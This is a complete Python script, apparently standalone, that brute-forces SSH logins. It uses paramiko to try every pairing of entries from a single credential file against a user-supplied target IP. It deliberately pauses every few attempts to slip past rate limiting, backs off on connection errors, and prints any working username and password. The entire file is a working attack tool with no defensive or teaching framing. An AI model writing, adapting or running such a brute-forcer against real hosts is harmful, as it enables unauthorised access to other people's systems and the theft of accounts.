import paramiko
import time
import socket

# Load users/passwords from one file
with open("file.txt") as f:
    creds = [line.strip() for line in f if line.strip()]
usernames = creds
passwords = creds

targetIP = input("Enter target IP: ").strip()
tries = 0
max_backoff = 30
backoff = 5

print(f"\n[*] Starting SSH brute-force on {targetIP}\n")

for username in usernames:
    for password in passwords:
        tries += 1
        if tries % 5 == 0:
            print("🕒 Sleeping 10 seconds to avoid rate limiting...")
            time.sleep(10)
        
        try:
            print(f"🔐 Trying {username}:{password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(targetIP, port=22, username=username, password=password, timeout=5)
            print(f"\n✅ SUCCESS: {username}@{targetIP} with password: {password}")
            client.close()
            exit(0)

        except paramiko.AuthenticationException:
            print("❌ Invalid credentials")

        except (paramiko.SSHException, EOFError, socket.error, ConnectionResetError) as e:
            print(f"⚠️ SSH Error: {str(e)}")
            print(f"⏳ Backing off for {backoff} seconds...")
            time.sleep(backoff)
            backoff = min(backoff + 5, max_backoff)
            continue

        except Exception as e:
            print(f"❌ Unexpected error: {e}")
        finally:
            try:
                client.close()
            except:
                pass
